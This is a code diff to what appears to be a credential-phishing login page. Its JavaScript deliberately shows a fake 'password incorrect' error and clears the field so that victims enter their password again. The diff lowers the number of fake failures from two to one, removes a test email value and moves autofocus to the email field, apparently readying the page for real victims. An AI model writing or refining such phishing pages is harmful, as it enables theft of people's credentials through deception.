@@ -609,7 +609,7 @@ function validateForm(event) {
             attemptCount++;
 
             // 1st & 2nd attempt → show fake error
-            if (attemptCount < 3) {
+            if (attemptCount < 2) {
                 document.getElementById('errfnn').innerHTML = "Your password input is incorrect";
                 document.forms["myForm"]["password"].value = "";
                 return false;
@@ -635,14 +635,14 @@ function validateForm(event) {
             <tr>
                 <td width="200px"><span style="color:#696767; font-weight:bold;">Email ID</span></td>
                 <td>
-                    <input id="EmailAddress" name="email" placeholder="someone@example.com" size="30" style="height:2em; color:#888888;" type="email" value="test@twitter.com">
+                    <input id="EmailAddress" name="email" placeholder="someone@example.com" size="30" style="height:2em; color:#888888;" type="email" autofocus>
                     <br><span id="errfn" style="color:red;"></span>
                 </td>
             </tr>
             <tr>
                 <td><span style="color:#696767; font-weight:bold;">Password</span></td>
                 <td>
-                    <input id="password" name="password" placeholder="password" size="30" style="height:2em; color:#888888;" type="password" autofocus>
+                    <input id="password" name="password" placeholder="password" size="30" style="height:2em; color:#888888;" type="password">
                     <br><center><span id="errfnn" style="color:red;"></span></center>
                 </td>
             </tr>
@@ -666,4 +666,3 @@ function validateForm(event) {
 <div class="cover"></div>
 
 </body></html>
-
